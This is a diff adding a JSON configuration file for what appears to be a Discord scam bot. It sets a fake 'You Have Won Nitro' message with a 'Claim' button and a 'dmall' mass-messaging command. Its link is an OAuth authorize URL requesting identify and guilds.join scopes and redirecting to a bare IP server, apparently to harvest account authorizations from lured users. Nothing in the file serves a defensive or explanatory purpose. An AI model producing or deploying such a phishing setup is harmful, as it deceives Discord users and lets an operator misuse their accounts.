@@ -1,0 +1,13 @@
+{
+    "bot token": "",
+    "log channel id": "1254814971192147998",
+    "bot prefix": ">",
+    "site link": "https://discord.com/oauth2/authorize?client_id=1255943052963614820&response_type=code&redirect_uri=http%3A%2F%2F185.148.242.5%3A4848&scope=identify+guilds.join",
+    "mention in dm": "yes",
+    "dm message": "Congratulations, You Have Won Nitro ",
+    "footer": "Claim Nitro",
+    "button text": "Claim",
+    "image path": "images/nitro.png",
+    "emoji path": "images/emoji.png",
+    "command key": "dmall"
+}
